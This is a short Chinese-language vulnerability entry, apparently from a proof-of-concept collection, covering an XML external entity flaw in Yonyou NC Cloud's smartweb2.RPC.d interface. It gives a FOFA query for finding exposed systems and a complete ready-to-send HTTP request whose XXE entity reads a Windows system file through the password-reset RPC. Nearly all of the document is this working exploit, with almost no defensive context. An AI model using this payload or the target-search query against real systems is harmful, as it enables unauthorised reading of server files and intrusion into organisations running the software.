## 用友NC_CLOUD_smartweb2.RPC.d_XML外部实体注入

用友NC系统的smartweb2.RPC.d接口存在XML外部实体注入漏洞。

## fofa
```
app="用友-UFIDA-NC"
```

## poc
```
POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25
Content-Length: 258
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>
```
![3a124b876c9485904654afbcc4d41771](https://github.com/wy876/POC/assets/139549762/bfe04702-24a5-435a-a67e-e26bfa9447c6)
